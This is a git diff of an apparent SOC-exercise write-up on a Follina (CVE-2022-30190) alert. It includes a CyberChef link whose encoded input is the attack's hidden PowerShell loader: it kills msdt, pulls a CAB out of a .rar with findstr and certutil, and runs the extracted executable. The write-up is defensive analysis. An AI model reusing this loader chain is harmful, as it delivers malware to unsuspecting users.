@@ -66,7 +66,7 @@ I'm curious as to how this got on the device. We can clearly see it received it 
 > Here is the result. You'll notice that it's the command that's accesses the rar file. 
 https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=SkdOdFpDQTlJQ0pqT2x4M2FXNWtiM2R6WEhONWMzUmxiVE15WEdOdFpDNWxlR1VpTzFOMFlYSjBMVkJ5YjJObGMzTWdKR050WkNBdGQybHVaRzkzYzNSNWJHVWdhR2xrWkdWdUlDMUJjbWQxYldWdWRFeHBjM1FnSWk5aklIUmhjMnRyYVd4c0lDOW1JQzlwYlNCdGMyUjBMbVY0WlNJN1UzUmhjblF0VUhKdlkyVnpjeUFrWTIxa0lDMTNhVzVrYjNkemRIbHNaU0JvYVdSa1pXNGdMVUZ5WjNWdFpXNTBUR2x6ZENBaUwyTWdZMlFnUXpwY2RYTmxjbk5jY0hWaWJHbGpYQ1ltWm05eUlDOXlJQ1YwWlcxd0pTQWxhU0JwYmlBb01EVXRNakF5TWkwd05ETTRMbkpoY2lrZ1pHOGdZMjl3ZVNBbGFTQXhMbkpoY2lBdmVTWW1abWx1WkhOMGNpQlVWazVFVW1kQlFVRkJJREV1Y21GeVBqRXVkQ1ltWTJWeWRIVjBhV3dnTFdSbFkyOWtaU0F4TG5RZ01TNWpJQ1ltWlhod1lXNWtJREV1WXlBdFJqb3FJQzRtSm5KbllpNWxlR1VpT3c9PQo
 
-Since I was confused about how the file got on here and it clearly looks like the remote code execution is on here, I went to the Inbox for a final look. Looks like and ria.ru email sent the file to Jonas. 
+Since I was confused about how the file got on here and it clearly looks like the remote code execution is on here, I went to the Inbox for a final look. Looks like a ria.ru email sent the file to Jonas. 
 
 ![Screen Shot 2022-09-23 at 1 15 57 PM](https://user-images.githubusercontent.com/74877876/192018532-23b856c4-5a04-4aaa-a088-443902f5e9a2.png)
 
@@ -74,3 +74,9 @@ Since I was confused about how the file got on here and it clearly looks like th
 True Positive as the file was emailed to the user which connects to a malicious IP related to cve-2022-30190.
 
 ## Helpful Links
+AnyRun
+VirusTotal
+URLHouse
+URLScan
+HybridAnalysis
+
